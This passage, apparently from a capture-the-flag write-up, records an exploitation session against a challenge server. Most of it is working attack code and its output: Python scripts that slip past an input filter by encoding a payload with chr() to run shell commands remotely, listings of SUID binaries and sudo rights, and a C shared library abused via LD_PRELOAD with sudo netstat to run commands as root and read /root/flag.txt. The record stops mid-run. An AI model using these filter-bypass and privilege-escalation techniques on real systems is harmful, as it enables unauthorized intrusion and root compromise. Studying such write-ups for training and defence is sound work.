+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    try:
+</span></span><span style=display:flex><span>        with socket.socket<span style=color:#f92672>(</span>socket.AF_INET, socket.SOCK_STREAM<span style=color:#f92672>)</span> as s:
+</span></span><span style=display:flex><span>            s.settimeout<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[*] Connecting to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.connect<span style=color:#f92672>((</span>HOST, PORT<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Connected.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Sending payload...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.sendall<span style=color:#f92672>(</span>payload.encode<span style=color:#f92672>()</span> + b<span style=color:#e6db74>&#39;\n&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Payload sent.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Receiving response...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>            try:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>while</span> True:
+</span></span><span style=display:flex><span>                    chunk <span style=color:#f92672>=</span> s.recv<span style=color:#f92672>(</span>4096<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> not chunk:
+</span></span><span style=display:flex><span>                        break
+</span></span><span style=display:flex><span>                    response <span style=color:#f92672>+=</span> chunk
+</span></span><span style=display:flex><span>            except socket.timeout:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Socket timeout reached.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            except Exception as e:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Error while receiving: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Response received:&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            decoded_response <span style=color:#f92672>=</span> response.decode<span style=color:#f92672>(</span>errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>decoded_response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    except socket.timeout:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Connection timed out to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except socket.error as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Socket error: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except Exception as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] An error occurred: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main<span style=color:#f92672>()</span>
+</span></span></code></pre></div><p>Response is juicy!!!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ubuntu@sandbox:~ $ cd /home/ubuntu <span style=color:#f92672>&amp;&amp;</span> python3 /home/ubuntu/exploit_user.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connecting to exp.cybergame.sk:7002
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connected.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending payload...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Payload sent.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Receiving response...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response received:
+</span></span><span style=display:flex><span>&gt;&gt;   <span style=color:#ae81ff>1566413</span>    <span style=color:#ae81ff>640</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root       <span style=color:#ae81ff>653888</span> Dec <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2023</span> /usr/lib/openssh/ssh-keysign
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1552816</span>     <span style=color:#ae81ff>52</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>52880</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/chsh
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1552810</span>     <span style=color:#ae81ff>64</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>62672</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/chfn
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1552948</span>     <span style=color:#ae81ff>88</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>88496</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/gpasswd
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1555727</span>     <span style=color:#ae81ff>68</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>68248</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/passwd
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1558016</span>     <span style=color:#ae81ff>36</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>35128</span> Mar <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2024</span> /usr/bin/umount
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1557992</span>     <span style=color:#ae81ff>72</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>72000</span> Mar <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2024</span> /usr/bin/su
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1555258</span>     <span style=color:#ae81ff>48</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>48896</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/newgrp
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1554627</span>     <span style=color:#ae81ff>60</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>59704</span> Mar <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2024</span> /usr/bin/mount
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>1589119</span>    <span style=color:#ae81ff>276</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root       <span style=color:#ae81ff>281624</span> Jun <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2023</span> /usr/bin/sudo
+</span></span><span style=display:flex><span><span style=color:#ae81ff>256</span>
+</span></span></code></pre></div><p>Analyzing SUID binaries for potential privilege escalation vectors.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;exp.cybergame.sk&#34;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>7002</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Builds the payload using chr() to bypass filters.&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    import_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;__import__&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    os_module <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;os&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    system_func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;system&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    cmd_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in command<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> f<span style=color:#e6db74>&#34;getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def main<span style=color:#f92672>()</span>:
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Check if sudo can be used without password</span>
+</span></span><span style=display:flex><span>    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;sudo -l&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    try:
+</span></span><span style=display:flex><span>        with socket.socket<span style=color:#f92672>(</span>socket.AF_INET, socket.SOCK_STREAM<span style=color:#f92672>)</span> as s:
+</span></span><span style=display:flex><span>            s.settimeout<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[*] Connecting to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.connect<span style=color:#f92672>((</span>HOST, PORT<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Connected.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Sending payload...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.sendall<span style=color:#f92672>(</span>payload.encode<span style=color:#f92672>()</span> + b<span style=color:#e6db74>&#39;\n&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Payload sent.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Receiving response...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>            try:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>while</span> True:
+</span></span><span style=display:flex><span>                    chunk <span style=color:#f92672>=</span> s.recv<span style=color:#f92672>(</span>4096<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> not chunk:
+</span></span><span style=display:flex><span>                        break
+</span></span><span style=display:flex><span>                    response <span style=color:#f92672>+=</span> chunk
+</span></span><span style=display:flex><span>            except socket.timeout:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Socket timeout reached.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            except Exception as e:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Error while receiving: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Response received:&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            decoded_response <span style=color:#f92672>=</span> response.decode<span style=color:#f92672>(</span>errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>decoded_response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    except socket.timeout:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Connection timed out to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except socket.error as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Socket error: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except Exception as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] An error occurred: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main<span style=color:#f92672>()</span>
+</span></span></code></pre></div><p>Checking sudo permissions to determine if it can be used for privilege escalation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ubuntu@sandbox:~ $ cd /home/ubuntu <span style=color:#f92672>&amp;&amp;</span> python3 /home/ubuntu/exploit_user.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connecting to exp.cybergame.sk:7002
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connected.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending payload...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Payload sent.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Receiving response...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response received:
+</span></span><span style=display:flex><span>&gt;&gt; Matching Defaults entries <span style=color:#66d9ef>for</span> calc on fc07b8081fbf:
+</span></span><span style=display:flex><span>    env_reset, mail_badpass,
+</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin,
+</span></span><span style=display:flex><span>    use_pty, env_keep<span style=color:#f92672>+=</span>LD_PRELOAD
+</span></span><span style=display:flex><span>User calc may run the following commands on fc07b8081fbf:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: /bin/netstat
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>Exploiting sudo with LD_PRELOAD to access root user secrets.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#include &lt;stdio.h&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#include &lt;stdlib.h&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#include &lt;unistd.h&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>// Constructor <span style=color:#66d9ef>function</span> that runs when the library is loaded
+</span></span><span style=display:flex><span>void __attribute__<span style=color:#f92672>((</span>constructor<span style=color:#f92672>))</span> init<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    // Clear environment variables that might interfere
+</span></span><span style=display:flex><span>    unsetenv<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;LD_PRELOAD&#34;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span>    // Execute the command to read the root flag
+</span></span><span style=display:flex><span>    // Assuming the flag is in /root/flag.txt based on the previous challenge structure
+</span></span><span style=display:flex><span>    system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;/bin/cat /root/flag.txt&#34;</span><span style=color:#f92672>)</span>;
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span></code></pre></div><p>Creating a shared library exploit using LD_PRELOAD to access root user secrets.</p><p>The exploit code needs to be compiled on the target system where gcc might be available. I will now modify the exploit script to perform the following steps on the remote server:
+I Wrote a C code for the shared library (preload.c) to a temporary directory (/tmp).
+and Compiled the C code into a shared library (preload.so) using gcc in the temporary directory.</p><p>Executed the allowed <em>sudo</em> command <em>(/bin/netstat)</em> with the <em>LD_PRELOAD</em> environment variable pointing to our compiled shared library. This triggerred our code within the shared library to run with root privileges and retrieve the flag from the root directory. Let&rsquo;s try reading /root/flag.txt first based on the previous challenge pattern
+Creating and compiling a shared library exploit on the remote system to access root user secrets.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;exp.cybergame.sk&#34;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>7002</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Builds the payload using chr() to bypass filters.&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    import_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;__import__&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    os_module <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;os&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    system_func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in <span style=color:#e6db74>&#34;system&#34;</span><span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    cmd_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;+&#34;</span>.join<span style=color:#f92672>([</span>f<span style=color:#e6db74>&#34;chr({ord(c)})&#34;</span> <span style=color:#66d9ef>for</span> c in command<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> f<span style=color:#e6db74>&#34;getattr(__builtins__.__dict__[{import_key}]({os_module}), {system_func})({cmd_str})&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>def main<span style=color:#f92672>()</span>:
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Create a multi-step command to:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 1. Check if gcc is installed</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 2. Create the preload.c file in /tmp</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 3. Compile it if gcc exists</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 4. Use LD_PRELOAD with sudo netstat</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    which gcc || echo &#34;</span>gcc not found<span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    echo &#39;#include &lt;stdio.h&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>#include &lt;stdlib.h&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>#include &lt;unistd.h&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>void __attribute__((constructor)) init() {
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    unsetenv(&#34;</span>LD_PRELOAD<span style=color:#e6db74>&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    system(&#34;</span>cat /root/flag.txt<span style=color:#e6db74>&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>}&#39; &gt; /tmp/preload.c;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    if which gcc &gt; /dev/null; then
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        gcc -shared -fPIC /tmp/preload.c -o /tmp/preload.so &amp;&amp; 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        echo &#34;</span>Compiled successfully<span style=color:#e6db74>&#34; &amp;&amp; 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        sudo LD_PRELOAD=/tmp/preload.so /bin/netstat;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    else
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        echo &#34;</span>Cannot compile, looking <span style=color:#66d9ef>for</span> alternative methods<span style=color:#e6db74>&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        # Try to find the flag directly
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        find /root -type f -name &#34;</span>flag*<span style=color:#e6db74>&#34; 2&gt;/dev/null;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        # Try to use other methods to read root files
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        sudo /bin/netstat -help | grep -i file;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    fi
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> build_payload<span style=color:#f92672>(</span>command<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    try:
+</span></span><span style=display:flex><span>        with socket.socket<span style=color:#f92672>(</span>socket.AF_INET, socket.SOCK_STREAM<span style=color:#f92672>)</span> as s:
+</span></span><span style=display:flex><span>            s.settimeout<span style=color:#f92672>(</span>10<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[*] Connecting to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.connect<span style=color:#f92672>((</span>HOST, PORT<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Connected.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Sending payload...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            s.sendall<span style=color:#f92672>(</span>payload.encode<span style=color:#f92672>()</span> + b<span style=color:#e6db74>&#39;\n&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Payload sent.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Receiving response...&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            response <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>            try:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>while</span> True:
+</span></span><span style=display:flex><span>                    chunk <span style=color:#f92672>=</span> s.recv<span style=color:#f92672>(</span>4096<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> not chunk:
+</span></span><span style=display:flex><span>                        break
+</span></span><span style=display:flex><span>                    response <span style=color:#f92672>+=</span> chunk
+</span></span><span style=display:flex><span>            except socket.timeout:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Socket timeout reached.&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            except Exception as e:
+</span></span><span style=display:flex><span>                print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Error while receiving: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;[*] Response received:&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            decoded_response <span style=color:#f92672>=</span> response.decode<span style=color:#f92672>(</span>errors<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ignore&#39;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>            print<span style=color:#f92672>(</span>decoded_response<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    except socket.timeout:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Connection timed out to {HOST}:{PORT}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except socket.error as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] Socket error: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>    except Exception as e:
+</span></span><span style=display:flex><span>        print<span style=color:#f92672>(</span>f<span style=color:#e6db74>&#34;[-] An error occurred: {e}&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main<span style=color:#f92672>()</span>
+</span></span></code></pre></div><p>Executing the LD_PRELOAD exploit to access root user secrets with sudo privileges.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ubuntu@sandbox:~ $ cd /home/ubuntu <span style=color:#f92672>&amp;&amp;</span> python3 /home/ubuntu/exploit_user.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connecting to exp.cybergame.sk:7002
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Connected.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending payload...
